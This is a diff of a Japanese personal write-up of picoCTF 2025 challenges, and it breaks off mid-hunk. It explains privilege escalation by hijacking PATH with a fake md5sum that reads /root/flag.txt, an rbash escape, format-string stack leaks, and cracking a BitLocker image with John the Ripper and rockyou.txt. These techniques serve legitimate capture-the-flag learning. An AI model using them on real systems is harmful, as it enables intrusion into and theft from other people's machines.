@@ -3,35 +3,40 @@
 <head>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<title>0001.html</title>
+	<title>picoCTF 2025 writeup</title>
 	<link rel="stylesheet" href="/css/default.css">
 	<link rel="stylesheet" href="/css/code.css">
 	<style>
+		details > summary{font-family: 'Consolas',monospace; font-size: 1.15em;}
 		details.solved > summary{color: #00c000;}
 		details.unsolved > summary{color: #c00000;}
 	</style>
 </head>
-<body style="padding-left: min(calc(100vw - 800px), 20vw);">
+<body style="padding-left: min(20vw, max(calc(40vw - 320px), 0px)); width: max(60vw, min(90vw, calc(30vw + 480px)));">
 	<a href="/index.html">戻る</a>
-	<h3>もう少しで完成するページです</h3>
 	<h1>picoCTF 2025 writeup</h1>
-	<p><pre>Global      : RANK 375</pre></p>
-	<p><pre>JP Students	: RANK 18</pre></p>
+	<div><pre>Player Name : sig255</pre></div>
+	<div><pre>Score       : 4710</pre></div>
+	<div>
+		<pre>Global      : RANK 375</pre>
+		<pre>JP Students : RANK 18</pre>
+	</div>
+	<h2>Binary Exploitation</h2>
 	<details class="solved"><summary>&nbsp;75 points | PIE TIME</summary>
 		<div>
-			<p>vuln.cを読むと、</p>
 			<p><code>printf("Address of main: %p\n", &main);</code></p>
-			<p>でmain関数を指すポインタを出力し、</p>
+			<p>で<code>main</code>関数を指すポインタを出力し、</p>
 			<p><code>scanf("%lx", &val);</code></p>
 			<p>でユーザーの入力(ポインタ)を受け取り、</p>
-			<p><pre><code>void (*foo)(void) = (void (*)())val;<br>foo();</code></pre></p>
+			<pre><code>void (*foo)(void) = (void (*)())val;
+foo();</code></pre>
 			<p>で入力されたポインタが指す関数を実行している</p>
 		</div>
 		<div>
-			<p>win()を実行できればよさそう</p>
+			<p><code>win()</code>を実行させたい</p>
 		</div>
 		<div>
-			<p><a href="https://binary.ninja/free/" target="_blank">>> Binary Ninja Free</a>でvulnをデコンパイルしてみると、</p>
+			<p><a href="https://binary.ninja/free/" target="_blank">>> Binary Ninja Free</a>で<code>vuln</code>をデコンパイルしてみる。</p>
 			<table style="margin-left: 40px;">
 				<tr><th class="th_first">Name</th><th class="th_last">address</th></tr>
 				<tr><td style="padding: 0;">:</td><td style="padding: 0;">:</td></tr>
@@ -39,42 +44,41 @@
 				<tr><td>main</td><td>0x00000133d</td></tr>
 				<tr><td style="padding: 0;">:</td><td style="padding: 0;">:</td></tr>
 			</table>
-			<p>となっているから、</p>
-			<p>出力されたmainのポインタから <a href="https://www.google.com/search?q=0x133d-0x12a7" target="_blank">0x133d - 0x12a7</a> = 0x96 引いた値を入力すればいい</p>
+			<p>出力された<code>main</code>のポインタから<a href="https://www.google.com/search?q=0x133d-0x12a7" target="_blank">0x133d - 0x12a7</a> = 0x96 引いた値を入力すればいい</p>
 		</div>
 		<div>
 			<p><code class="bash">nc rescued-float.picoctf.net XXXXX</code></p>
-			<p><pre><code class="output">Address of main: 0x59e47fc5c33d<br>Enter the address to jump to, ex => 0x12345: </code></pre></p>
+			<pre><code class="output">Address of main: 0x59e47fc5c33d
+Enter the address to jump to, ex => 0x12345: </code></pre>
 		</div>
 		<div>
 			<p><a href="https://www.google.com/search?q=0x33d-0x96" target="_blank">0x33d - 0x96</a> = 0x2a7 なので、</p>
-			<p><code>0x59e47fc5c2a7</code>を入力してエンター</p>
+			<p><code>0x59e47fc5c2a7</code>が<code>win()</code>の位置</p>
 		</div>
 		<div><p><code>picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_********}</code></p></div>
 	</details>
 	<details class="solved"><summary>100 points | hash-only-1</summary>
 		<div>
 			<p>バイナリを<a href="https://binary.ninja/free/" target="_blank">Binary Ninja Free</a>でデコンパイルし読んでみると、</p>
-			<p><pre><code>setgid(0);<br>setuid(0);</code></pre></p>
+			<pre><code>setgid(0);
+setuid(0);</code></pre>
 			<p>で権限昇格したのち</p>
 			<p><code>system("/bin/bash -c 'md5sum /root/flag.txt'");</code></p>
 			<p>でフラグのmd5ハッシュを出力している</p>
 		</div>
 		<div>
 			<p>こちらが干渉できるのは、<code>md5sum</code>の部分</p>
-			<p>この記述において<code>md5sum</code>は、実行ファイルを検索するディレクトリが連ねられた環境変数<code>PATH</code>のもと、</p>
-			<p><code>md5sum</code>という実行ファイルの場所が検索され、そこに引数<code>/root/flag.txt</code>を渡して実行している。</p>
-			<p>だから、flagの内容を出力するスクリプトを<code>md5sum</code>という名前で新しく作成して<code>PATH</code>に登録し、flaghasherを実行すればよい</p>
+			<p>この記述において<code>md5sum</code>は、実行ファイルを検索するディレクトリが連ねられた環境変数<code>PATH</code>のもと、<code>md5sum</code>という実行ファイルの場所が検索され、そこに引数<code>/root/flag.txt</code>を渡して実行している。</p>
+			<p>だから、flagの内容を出力するスクリプトを<code>md5sum</code>という名前で新しく作成して<code>PATH</code>に登録し、<code>flaghasher</code>を実行すればよい</p>
 		</div>
 		<div>
-			<p>スクリプトの具体的な内容は、bashの<code>cat</code>でフラグの中身を出力させればよさそう</p>
-			<p><code>/root</code>は基本的にroot権限でしかアクセスできないので、sudoをつける</p>
-			<p><code>sudo cat /root/flag.txt</code></p>
+			<p>bashスクリプトを使う。スクリプトの中身は</p>
+			<p><code>sudo cat /root/flag.txt</code>とする</p>
 		</div>
 		<div>
 			<p>nanoなどを使わなくても、</p>
 			<p><code class="bash">echo -e '[ファイルの内容]' > [ファイル名]</code></p>
-			<p>とすれば、スクリプトをファイルに保存できる。</p>
+			<p>とすれば、スクリプトを新しくファイルに保存できる。</p>
 			<p><code class="bash">chmod +x [ファイル名]</code></p>
 			<p>で、スクリプトを実行可能にできる</p>
 		</div>
@@ -100,11 +104,11 @@
 	</details>
 	<details class="solved"><summary>200 points | hash-only-2</summary>
 		<div>
-			<p><small>flaghasher は hash-only-1 のと同じと考えてよさそうかなぁ</small></p>
-			<p>hash-only-1 と違うのは、flaghasherが同ディレクトリからなくなっていること、bashでなくrbashが起動されていること</p>
+			<p><small><code>flaghasher</code>は hash-only-1 と同じと考えてよさそう</small></p>
+			<p>hash-only-1 と違うのは、<code>flaghasher</code>が同ディレクトリからなくなっていることと、bashでなくrbashが起動されていること</p>
 		</div>
 		<div>
-			<p>まず、flaghasherを探してみる</p>
+			<p>まず、<code>flaghasher</code>を探してみる</p>
 			<p><code class="bash">find [場所] -name [ファイル名]</code></p>
 			<p>でファイルを探せる</p>
 			<p><code class="bash">find / -name flaghasher</code></p>
@@ -114,9 +118,7 @@
 			<p>つまり、<code class="bash">flaghasher</code>で実行できる</p>
 		</div>
 		<div>
-			<p>rbashの制限から脱出する方法は色々あるそうです。今回は</p>
-			<p><code class="bash">bash</code></p>
-			<p>で通常のbashを起動しました。</p>
+			<p>rbashの制限から脱出する方法は色々あるみたい。今回は<code class="bash">bash</code>で通常のbashを起動した。</p>
 		</div>
 		<div>
 			<p>ここまで来たらあとはhash-only-1 と同じ。まとめると、</p>
@@ -132,18 +134,18 @@
 	</details>
 	<details class="solved"><summary>200 points | PIE TIME 2</summary>
 		<div>
-			<p>vuln.c を読む。PIE TIME と異なる点は、ユーザーの入力(ポインタ)を受け取る前、</p>
+			<p>PIE TIME と異なる点は、ユーザーの入力(ポインタ)を受け取る前、</p>
 			<p><code>fgets(buffer, 64, stdin);</code></p>
 			<p>でバッファにユーザーの入力を受け取り、</p>
 			<p><code>printf(buffer);</code></p>
-			<p>でprintfの第一引数としている。</p>
+			<p>でprintfの第一引数としていること。</p>
 			<p>この時点で、win()関数のポインタを特定する必要がある</p>
 		</div>
 		<div>
 			<p><code>printf([ユーザーの入力]);</code>は良く知られた脆弱性で、そこを突いた攻撃は書式文字列攻撃という。</p>
 			<p>printfの第1引数に<code>%p</code>が使われると、そこに代入されるのはスタックに保存された値(16進表記)なので、</p>
 			<p><code>%p%p%p%p....</code>を入力すれば、スタックの中身が</p>
-			<p><code>0x2e70257025702570(nil)0x555f507c62ad0x7ffcf1214760....</code>と出力される</p>
+			<p><code class="output">0x2e70257025702570(nil)0x555f507c62ad0x7ffcf1214760....</code>と出力される</p>
 		</div>
 		<div>
 			<p>また、PIE TIME から分かるように、ポインタの16進数の下3桁はデコンパイルした時の値と同じになるようなので、</p>
@@ -162,8 +164,8 @@
 		</div>
 		<div>
 			<p><code>%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p</code>を入力すると、</p>
-			<p><code>0x5ea28f7132a1_...(略)..._0x5ea254c2a<b>1c0</b>_...(略)..._0x7a3392b9d083</code>と返された</p>
-			<p>1c0 が _start と対応していると推測すると、win()のポインタは 0x5ea254c2a<b>36a</b> と予想できる。</p>
+			<p><code class="output">0x5ea28f7132a1_...(略)..._0x5ea254c2a<b>1c0</b>_...(略)..._0x7a3392b9d083</code>と返された</p>
+			<p>1c0 が _start と対応していると推測すると、win()のポインタは<code>0x5ea254c2a<b>36a</b></code>と予想できる。</p>
 			<p>これを入力するとフラグを入手できた</p>
 		</div>
 		<div><p><code>picoCTF{p13_5h0u1dn'7_134k_********}</code></p></div>
@@ -188,7 +190,7 @@
 			<p><small>自分は詳しくは理解できていませんが、</small></p>
 			<p>https通信に使われているRSA暗号は、適切に鍵を生成しないと脆弱になります。</p>
 			<p><a href="https://www.dcode.fr/rsa-cipher" target="_blank">>> RSA Cipher Calculator</a></p>
-			<p>等のツールを使って、与えられたN, e, c(cyphertext(暗号化された文))を入力してDecryptすると、フラグを得られます</p>
+			<p>等を使って、与えられたN, e, c(cyphertext(暗号化された文))を入力してDecryptすると、フラグを得られます</p>
 			<p>今回は、鍵の生成に用いる2つ素数のうち1つが 2 と非常に小さい数であったため、簡単に特定できてしまったみたいです。</p>
 		</div>
 		<div><p><code>picoCTF{tw0_1$_pr!m********}</code></p></div>
@@ -196,17 +198,19 @@
 	<details class="solved"><summary>200 points | Guess My Cheese (Part 1)</summary>
 		<div>
 			<p><code class="bash">nc verbal-sleep.picoctf.net 58487</code></p>
-			<p><pre><code class="output">Here's my secret cheese -- if you're Squeexy, you'll be able to guess it:  VZOONNKWKV
+			<pre><code class="output">Here's my secret cheese -- if you're Squeexy, you'll be able to guess it:  VZOONNKWKV
 Hint: The cheeses are top secret and limited edition, so they might look different from cheeses you're used to!
 Commands: (g)uess my cheese or (e)ncrypt a cheese
-What would you like to do?</code></pre></p>
+What would you like to do?</code></pre>
 		</div>
 		<div>
 			<p>単一換字式暗号だと思うけど、総当たりは無理なので何かしらの名前がついた暗号化形式だと思う。</p>
 			<p>とりあえず(e)ncrypt a cheeseしてみる</p>
 		</div>
 		<div>
-			<p><pre><code class="output">What would you like to do?<br>e<br>What cheese would you like to encrypt? </code><code>cheese</code></pre></p>
+			<pre><code class="output">What would you like to do?
+e
+What cheese would you like to encrypt? </code><code>cheese</code></pre>
 			<p><code class="output">I'm sorry I haven't had that cheese before, so I can't encrypt it!</code></p>
 		</div>
 		<div>
@@ -253,21 +257,40 @@ What would you like to do?</code></pre></p>
 		</div>
 	</details>
 	<details class="unsolved"><summary>400 points | ChaCha Slide</summary>
-		<div><p>わからない！</p></div>
+		<p>わからない！</p>
 	</details>
 	<details class="unsolved"><summary>500 points | Ricochet</summary>
-		<div><p>絶対難しい</p></div>
+		<p>絶対難しい</p>
 	</details>
 	<h2>Forensics</h2>
 	<details class="solved"><summary>&nbsp;50 points | Ph4nt0m 1ntrud3r</summary>
 		<div>
-			<p>pcapファイルを <a href="https://www.wireshark.org/">>> Wireshark</a> で開く</p>
-			<p>時系列順にすると、<code>TCP Payload</code>(送信データの本体)の長さがきれいに並ぶので、表示をTCP payloadのみにして、すべてコピーすると、</p>
-			<p><code>7935305a646d493d<br>6f62306f3569303d<br>36646d645738553d<br>4b5748393856633d<br>6b70524d31436b3d<br>7931765a7470593d<br>6230676b4445453d<br>
-				48374455666a6b3d<br>583577344f5a6f3d<br>38575855506c773d<br>464e6f4e3374633d<br>6842466d7833553d<br>465569577832383d<br>4c4a7a68474c593d<br>745863592f45773d<br>
-				63476c6a62304e5552673d3d<br>657a46305833633063773d3d<br>626e52666447673064413d3d<br>587a4d3063336c6664413d3d<br>596d68664e484a664f413d3d<br>5a5445775a54677a4f513d3d<br>66513d3d</code></p>
-			<p><a href="https://gchq.github.io/CyberChef/">>> CyberChef</a> で <a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')">From Hex</a> にかけるとBase64文字列らしくなる(=で終わる)ので、</p>
-			<p>さらに <a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')From_Base64('A-Za-z0-9%2B/%3D',true,false)">From Base64</a> にかけると出力の末尾にフラグが見つかる</p>
+			<p>pcapファイルを<a href="https://www.wireshark.org/" target="_blank">>> Wireshark</a>で開く</p>
+			<p>時系列順にすると、<code>TCP Payload</code>(送信データの本体)の長さがきれいに並ぶので、表示を<code>TCP Payload</code>のみにして、すべてコピーすると、</p>
+			<pre><code class="output">7935305a646d493d
+6f62306f3569303d
+36646d645738553d
+4b5748393856633d
+6b70524d31436b3d
+7931765a7470593d
+6230676b4445453d
+48374455666a6b3d
+583577344f5a6f3d
+38575855506c773d
+464e6f4e3374633d
+6842466d7833553d
+465569577832383d
+4c4a7a68474c593d
+745863592f45773d
+63476c6a62304e5552673d3d
+657a46305833633063773d3d
+626e52666447673064413d3d
+587a4d3063336c6664413d3d
+596d68664e484a664f413d3d
+5a5445775a54677a4f513d3d
+66513d3d</code></pre>
+			<p><a href="https://gchq.github.io/CyberChef/" target="_blank">>> CyberChef</a>で<a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')" target="_blank">From Hex</a>にかけるとBase64文字列らしくなる(=で終わる)ので、</p>
+			<p>さらに<a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')From_Base64('A-Za-z0-9%2B/%3D',true,false)" target="_blank">From Base64</a>にかけると出力の末尾にフラグが見つかる</p>
 			<p><small>正直あんまりCyberChef使いたくないけどね</small></p>
 		</div>
 		<div><p><code>picoCTF{1t_w4snt_th4t_34sy_tbh_4r_********}</code></p></div>
@@ -275,22 +298,26 @@ What would you like to do?</code></pre></p>
 	<details class="solved"><summary>100 points | RED</summary>
 		<div>
 			<p>tEXtチャンクを見てみると、</p>
-			<blockquote style="font-style: italic;">Crimson heart, vibrant and bold,<br>Hearts flutter at your sight.<br>Evenings glow softly red,<br>
-				Cherries burst with sweet life.<br>Kisses linger with your warmth.<br>Love deep as merlot.<br>
-				Scarlet leaves falling softly,<br>Bold in every stroke.</blockquote>
-			<p>というPoemがあるが、文の最初の文字をつなげると、<i>CHECKLSB</i>となる</p>
+			<pre><code class="output">Crimson heart, vibrant and bold,
+Hearts flutter at your sight.
+Evenings glow softly red,
+Cherries burst with sweet life.
+Kisses linger with your warmth.
+Love deep as merlot.
+Scarlet leaves falling softly,
+Bold in every stroke.</code></pre>
+			<p>というPoemがあるが、文の最初の文字をつなげると、<b>CHECKLSB</b>となる</p>
 			<p>LSBとは最下位ビットのことで、画像の最下位ビットを変えても視覚的には判別できないため情報を隠すために使われる</p>
-			<p>LSBだけを抜き出して(0はそのまま、1なら255)画像にすると以下のようになる</p>
+			<p>LSBだけを抜き出して画像にする(0なら0、1なら255)と以下のようになる</p>
 		</div>
 		<div style="margin-left: 40px;">
-			<figure style="display: inline-block; margin-inline: 16px;"><figcaption>RGBA全て</figcaption><img src="/images/0001/RED_RGBA.png" width="128" height="128"></figure>
 			<figure style="display: inline-block; margin-inline: 16px;"><figcaption>Rのみ</figcaption><img src="/images/0001/RED_R.png" width="128" height="128"></figure>
 			<figure style="display: inline-block; margin-inline: 16px;"><figcaption>Gのみ</figcaption><img src="/images/0001/RED_G.png" width="128" height="128"></figure>
 			<figure style="display: inline-block; margin-inline: 16px;"><figcaption>Bのみ</figcaption><img src="/images/0001/RED_B.png" width="128" height="128"></figure>
 			<figure style="display: inline-block; margin-inline: 16px;"><figcaption>Aのみ</figcaption><img src="/images/0001/RED_A.png" width="128" height="128"></figure>
 		</div>
 		<div>
-			<p>各行ごとに同じデータが連なっていることが分かる。このままだと分からないので、各色ごとに1行のデータを取り出してみる</p>
+			<p>各行で同じデータが連なっていることが分かる。このままだと分からないので、各色ごとに1行目のLSBを取り出してみる</p>
 			<table style="margin-left: 40px;">
 				<tr><th class="th_first">色</th><th class="th_last">データ(2進数)</th></tr>
 				<tr><td>R</td><td>00000101000001000001000101000000010101000000000101000000000000000101000101000100000101000101000101010000010000010100000000000101</td></tr>
@@ -300,11 +327,11 @@ What would you like to do?</code></pre></p>
 			</table>
 		</div>
 		<div>
-			<p>かなり悩んだが、それぞれのデータの最後の4文字が、2文字の繰り返しになっていることから、Base64の最後の=と対応していると仮定すると、</p>
+			<p><small>かなり悩んだが、</small>それぞれのデータの最後の4文字が、2文字の繰り返しになっていることから、Base64の最後の=と対応していると仮定すると、</p>
 			<p>左から2画素ずつで1文字を表しているとわかる。</p>
 			<p><code>00111101</code> : <code>=</code>をASCIIの2進数で表した</p>
-			<p><code>00101101</code> : 最後の2画素をRGBARGBAの順にした</p>
-			<p>左から4つ目のAを反転すればよさそう..？ やってみると、</p>
+			<p><code>00101101</code> : 最後の2画素を<code>RGBARGBA</code>の順にした</p>
+			<p><code>RGBARGBA</code>の左から4つ目のAを反転すればよさそう..？ やってみると、</p>
 		</div>
 		<div>
 			<p><code>cGljb0NURntyM2RfMXNfdGgzX3VsdDFtNHQzX2N1cjNfZjByXzU0ZG4zNTVffQ==</code></p>
@@ -331,45 +358,51 @@ What would you like to do?</code></pre></p>
 			</table>
 		</div>
 		<div>
-			<p>よ～くこれを見てみると、</p>
-			<p>Rは3画素ごとの最初の画素が0 Bは3画素ごとの最後の画素が0</p>
+			<p>これをよ～く見てみると、</p>
+			<ul>
+				<li>Rは3画素ごとの最初の画素が0</li>
+				<li>Bは3画素ごとの最後の画素が0</li>
+			</ul>
 			<p>ということが読み取れるので、3画素ごとに<code>RGBRGBRG</code>が1文字になっていると推測できる。</p>
 			<p>この規則で文字にするとフラグになる</p>
 		</div>
 		<div><p><code>picoCTF{fl4g_h45_fl4g********}</code></p></div>
+		<div>
+			<p>にしても画像ファイルが大きすぎて扱いづらかった</p>
+		</div>
 	</details>
 	<details class="solved"><summary>200 points | Bitlocker-1</summary>
 		<div>
 			<p>Jackyはパスワードを単純なものに設定したみたいなので、</p>
-			<p><a href="https://www.openwall.com/john/">>> John the Ripper</a>(JtR)を使って</p>
-			<p>流出したパスワードデータとして有名な<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz">rockyou.txt</a>を試す</p>
+			<p><a href="https://www.openwall.com/john/" target="_blank">>> John the Ripper</a>(JtR)を使って</p>
+			<p>流出したパスワードデータとして有名な<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz" target="_blank">rockyou.txt</a>を試す</p>
 		</div>
 		<div><p>John the Ripper は Windows版を利用した</p></div>
 		<div>
-			<p>まず、bitlockerからハッシュを抽出するために、bitlocker2johnを使う。</p>
+			<p>まず、<code>bitlocker-1.dd</code>からハッシュを抽出するために、<code>bitlocker2john.exe</code>を使う。</p>
 			<p><code class="cmd">bitlocker2john.exe ..\..\bitlocker-1.dd</code></p>
-			<p><pre><code>User Password hash:
+			<pre><code class="output">User Password hash:
 <small>$bitlocker$0$16$cb4809fe9628471a411f8380e0f668db$1048576$12$d04d9c58eed6da010a000000$60$68156e51e53f0a01c076a32ba2b2999a...(略)</small>
 Hash type: User Password with MAC verification (slower solution, no false positives)
 <small>$bitlocker$1$16$cb4809fe9628471a411f8380e0f668db$1048576$12$d04d9c58eed6da010a000000$60$68156e51e53f0a01c076a32ba2b2999a...(略)</small>
 Hash type: Recovery Password fast attack
 <small>$bitlocker$2$16$2b71884a0ef66f0b9de049a82a39d15b$1048576$12$00be8a46ead6da0106000000$60$a28f1a60db3e3fe4049a821c3aea5e4b...(略)</small>
 Hash type: Recovery Password with MAC verification (slower solution, no false positives)
-<small>$bitlocker$3$16$2b71884a0ef66f0b9de049a82a39d15b$1048576$12$00be8a46ead6da0106000000$60$a28f1a60db3e3fe4049a821c3aea5e4b...(略)</small></code></pre></p>
+<small>$bitlocker$3$16$2b71884a0ef66f0b9de049a82a39d15b$1048576$12$00be8a46ead6da0106000000$60$a28f1a60db3e3fe4049a821c3aea5e4b...(略)</small></code></pre>
 			<p>今回欲しいのはユーザーパスワードなので、<code>$bitlocker$0$</code>をクラックする</p>
 			<p><code class="cmd">echo <small>$bitlocker$0$16$cb4809fe9628471a411f8380e0f668db$1048576$12$d04d9c58eed6da010a000000$60$68156e51e53f0a01c076a32ba2b2999a...(略)</small> > hash.txt</code></p>
 		</div>
 		<div>
 			<p><code class="cmd">john --wordlist=..\..\rockyou.txt hash.txt</code></p>
-			<p><code>jacqueline       (?)</code></p>
+			<p><code class="output">jacqueline       (?)</code></p>
 		</div>
 		<div>
 			<p>パスワードは<code>jacqueline</code>と分かった</p>
-			<p><small>ペリーの孫かな？<a href="https://sites.google.com/view/satomizu/%E7%A0%82%E7%B3%96%E6%B0%B4flash-%E3%83%9A%E3%83%AA%E3%83%BC%E3%81%AE%E8%82%89%E5%A3%B0">&nbsp;</a></small></p>
+			<p><small>ペリーの孫かな？<a href="https://sites.google.com/view/satomizu/%E7%A0%82%E7%B3%96%E6%B0%B4flash-%E3%83%9A%E3%83%AA%E3%83%BC%E3%81%AE%E8%82%89%E5%A3%B0" target="_blank">&nbsp;</a></small></p>
 		</div>
 		<div>
 			<p>パスワードが分かったので、<code>bitlocker-1.dd</code>をマウントする</p>
-			<p><a href="https://askubuntu.com/questions/617950/use-windows-bitlocker-encrypted-drive-on-ubuntu">>> encryption - Use (Windows) BitLocker-encrypted drive on Ubuntu - Ask Ubuntu</a></p>
+			<p><a href="https://askubuntu.com/questions/617950/use-windows-bitlocker-encrypted-drive-on-ubuntu" target="_blank">>> Use (Windows) BitLocker-encrypted drive on Ubuntu</a></p>
 			<p>が非常に参考になりました</p>
 		</div>
 		<div>
@@ -377,13 +410,13 @@ Hash type: Recovery Password with MAC verification (slower solution, no false po
 			<p><code class="bash">sudo apt-get install libfuse-dev</code></p>
 			<p><code class="bash">sudo mkdir /media/bitlocker /media/mount</code></p>
 			<p><code class="bash">sudo dislocker -r -V bitlocker-1.dd -u -- /media/bitlocker</code></p>
-			<p><code>Enter the user password: </code></p>
+			<p><code class="output">Enter the user password: </code></p>
 			<p><code class="bash">sudo -i</code></p>
 			<p><code class="root">cd /media/bitlocker</code></p>
 			<p><code class="root">mount -r -o loop dislocker-file /media/mount</code></p>
 			<p><code class="root">cd /media/mount</code></p>
 			<p><code class="root">ls</code></p>
-			<p><code>'$RECYCLE.BIN'  'System Volume Information'   flag.txt</code></p>
+			<p><code class="output">'$RECYCLE.BIN'  'System Volume Information'   flag.txt</code></p>
 			<p><code class="root">cat flag.txt</code></p>
 			<p>フラグを入手できた</p>
 		</div>
@@ -399,12 +432,12 @@ Hash type: Recovery Password with MAC verification (slower solution, no false po
 		<div>
 			<p>evtxのままでもWindowsのイベントビューワーで見れるが、イベント数が多く一つ一つ確かめるのは無謀</p>
 			<p>調べると、evtxはxmlに変換できるみたい</p>
-			<p><a href="https://github.com/omerbenamram/evtx">>> omerbenamram/evtx: A Fast (and safe) parser for the Windows XML Event Log (EVTX) format</a></p>
+			<p><a href="https://github.com/omerbenamram/evtx" target="_blank">>> omerbenamram/evtx</a></p>
 			<p>を使ってみる</p>
 			<p><code class="cmd">evtx_dump-v0.8.5.exe Windows_Logs.evtx > log.xml</code></p>
 		</div>
 		<div>
-			<p><a href="https://jp.emeditor.com/">EmEditor Free</a>で中を見てみる</p>
+			<p><a href="https://jp.emeditor.com/" target="_blank">>> EmEditor Free</a>で中を見てみる</p>
 			<p>picoCTF で検索してもなにもヒットしなかった。</p>
 			<p>Base64を疑って<code>==</code>を検索にかけると2箇所ヒットした。それぞれデコードすると</p>
 			<p><code>picoCTF{Ev3nt_vi3wv3r_</code></p>
@@ -413,14 +446,14 @@ Hash type: Recovery Password with MAC verification (slower solution, no false po
 			<p>ストーリーが3つに分割されていることから、Base64でエンコードされたフラグの断片がもう1箇所あると予想する</p>
 			<p>正規表現<code>[0-9A-Za-z+/]{20,}=</code>を用いて検索すると</p>
 			<p><code>NotificationInterval=</code>もヒットしたのでこれを全て選択し削除</p>
-			<p>20の部分をだんだん小さくして同じようなことを繰り返せば = で終わるBase64なら捕まえられる。</p>
+			<p>20の部分をだんだん小さくして同じようなことを繰り返せば<code>=</code>で終わるBase64なら捕まえられる。</p>
 			<p>幸いすぐに、19にするともう一つのBase64文字列が得られたのでこれを先ほどの2つのフラグの断片にするとフラグとなった</p>
 		</div>
 		<div><p><code>picoCTF{Ev3nt_vi3wv3r_1s_a_pr3tty_us3ful_t00l_********}</code></p></div>
 	</details>
 	<details class="solved"><summary>300 points | Bitlocker-2</summary>
 		<div><p>なんと、RAM dump の中にFlagがありました</p></div>
-		<div><p><a target="_blank" href="https://gitlab.com/devill.tamachan/binaryeditorbz/-/blob/master/README.md">>> BzEditor</a> を使ってバイナリ内を<code>picoCTF</code>と検索します</p></div>
+		<div><p><a href="https://gitlab.com/devill.tamachan/binaryeditorbz/-/blob/master/README.md" target="_blank">>> BzEditor</a>を使ってバイナリ内を<code>picoCTF</code>と検索します</p></div>
 		<div><p><code>picoCTF{B1tl0ck3r_dr1v3_d3crypt3d_********}</code></p></div>
 	</details>
 	<h2>General Skills</h2>
@@ -428,7 +461,7 @@ Hash type: Recovery Password with MAC verification (slower solution, no false po
 		<div>
 			<p>言われた通りnetcatで接続</p>
 			<p><code class="bash">nc verbal-sleep.picoctf.net 52486</code></p>
-			<p>Enterで物語を読み進めながらpicoCTFのRulesに則った正しい選択をする</p>
+			<p>Enterで物語を読み進めながらpicoCTFの<a href="https://play.picoctf.org/events/74" target="_blank">Rules</a>に則った正しい選択をする</p>
 		</div>
 		<div><p><code>picoCTF{m1113n1um_3d1710n_********}</code></p></div>
 	</details>
@@ -437,19 +470,25 @@ Hash type: Recovery Password with MAC verification (slower solution, no false po
 		<div>
 			<p><code>let key = String::from("CSUCKS"<u class="red_wavy">)</u></code></p>
 			<p><code>let key = String::from("CSUCKS")<b>;</b></code></p>
-			<p><a target="_blank" href="https://doc.rust-jp.rs/book-ja/ch01-02-hello-world.html?search=#rust%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%81%AE%E8%A7%A3%E5%89%96">>> Hello, World! - The Rust Programming Language 日本語版</a></p>
+			<p><a href="https://doc.rust-jp.rs/book-ja/ch01-02-hello-world.html?search=#rust%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%81%AE%E8%A7%A3%E5%89%96" target="_blank">>> Hello, World! - The Rust Programming Language 日本語版</a></p>
 			<p>式の終わりにはセミコロン<code>;</code>を付ける</p>
 		</div>
 		<div>
 			<p><code><u class="red_wavy">ret</u>;</code></p>
 			<p><code><b>return</b>;</code></p>
-			<p><a target="_blank" href="https://doc.rust-jp.rs/book-ja/ch03-03-how-functions-work.html#%E6%88%BB%E3%82%8A%E5%80%A4%E3%81%AE%E3%81%82%E3%82%8B%E9%96%A2%E6%95%B0">>> 関数 - The Rust Programming Language 日本語版</a></p>
-			<p>関数の途中に<code>return</code>で関数を抜けれる</p>
+			<p><a href="https://doc.rust-jp.rs/book-ja/ch03-03-how-functions-work.html#%E6%88%BB%E3%82%8A%E5%80%A4%E3%81%AE%E3%81%82%E3%82%8B%E9%96%A2%E6%95%B0" target="_blank">>> 関数 - The Rust Programming Language 日本語版</a></p>
+			<p>関数の途中で<code>return</code>を使い関数を抜ける</p>
 		</div>
 		<div>
-			<p><pre><code>println!(<br>    ":?",<br>    <u class="red_wavy">String::from_utf8_lossy(&decrypted_buffer)</u><br>)</code></pre></p>
-			<p><pre><code>println!(<br>    "<b>{:?}</b>",<br>    String::from_utf8_lossy(&decrypted_buffer)<br>)</code></pre></p>
-			<p><a target="_blank" href="https://doc.rust-lang.org/std/fmt/index.html">>> std::fmt - Rust</a></p>
+			<pre><code>println!(
+    ":?",
+    <u class="red_wavy">String::from_utf8_lossy(&decrypted_buffer)</u>
+)</code></pre>
+			<pre><code>println!(
+    "<b>{:?}</b>",
+    String::from_utf8_lossy(&decrypted_buffer)
+)</code></pre>
+			<p><a href="https://doc.rust-lang.org/std/fmt/index.html" target="_blank">>> std::fmt - Rust</a></p>
 			<p>フォーマット文字列として、<code>{}</code>を指定すると内容を出力できる。<small>なお、<code>{:?}</code>はデバック向きの記述</small></p>
 			<p><small>String..のほうに赤波線が引かれているのは、引数の数が超過しているため</small></p>
 		</div>
@@ -461,9 +500,15 @@ Hash type: Recovery Password with MAC verification (slower solution, no false po
 	</details>
 	<details class="solved"><summary>100 points | Rust fixme 2</summary>
 		<div>
-			<p><pre><code>fn decrypt(encrypted_buffer:Vec&lt;u8&gt;, borrowed_string: &String){<br>:<br>let party_foul = String::from("Using memory unsafe languages is a: ");<br>decrypt(encrypted_buffer, &party_foul);</code></pre></p>
-			<p><pre><code>fn decrypt(encrypted_buffer:Vec&lt;u8&gt;, borrowed_string: &<b>mut</b> String){<br>:<br>let <b>mut</b> party_foul = String::from("Using memory unsafe languages is a: ");<br>decrypt(encrypted_buffer, &<b>mut</b> party_foul);</code></pre></p>
-			<p><a target="_blank" href="https://doc.rust-jp.rs/book-ja/ch04-02-references-and-borrowing.html#%E5%8F%AF%E5%A4%89%E3%81%AA%E5%8F%82%E7%85%A7">>> 参照と借用 - The Rust Programming Language 日本語版</a></p>
+			<pre><code>fn decrypt(encrypted_buffer:Vec&lt;u8&gt;, borrowed_string: &String){
+:
+let party_foul = String::from("Using memory unsafe languages is a: ");
